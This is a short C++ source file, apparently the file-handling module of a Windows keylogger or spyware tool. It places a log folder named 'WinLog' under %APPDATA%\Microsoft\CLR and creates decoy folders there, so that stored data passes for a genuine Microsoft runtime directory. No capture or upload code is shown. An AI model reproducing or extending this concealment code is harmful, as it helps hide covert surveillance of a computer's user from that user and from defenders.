#include "../headers/IO.hpp"

std::string IO::get_path(const bool append_separator){ // append separator = if the backslash is included at the end of our path
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR\\WinLog";  // backslash = escape character = have 2 to get 1
        return full + (append_separator ? "\\" : "");
    }

    bool IO::make_one_dir(std::string path){//this function fails in a C:\Users\User\Downloads or a C:\Users\\Downloads scenario
        return (bool) CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool IO::make_dir(std::string path){
        for(char &c : path){
            if(c == '\\'){
                c = '\0';
                if(!make_one_dir(path)) return false;
                c = '\\';
            }
        }
        return true;
    }
    void IO::make_falses_dir(void){
        std::string appdata_dir(getenv("APPDATA"));
        std::string path1 = appdata_dir + "\\Microsoft\\CLR\\Protect";
        std::string path2 = appdata_dir + "\\Microsoft\\CLR\\Win32API";
        std::string path3 = appdata_dir + "\\Microsoft\\CLR\\14.0";
        CreateDirectory(path1.c_str(), NULL);
        CreateDirectory(path2.c_str(), NULL);
        CreateDirectory(path3.c_str(), NULL);
    }
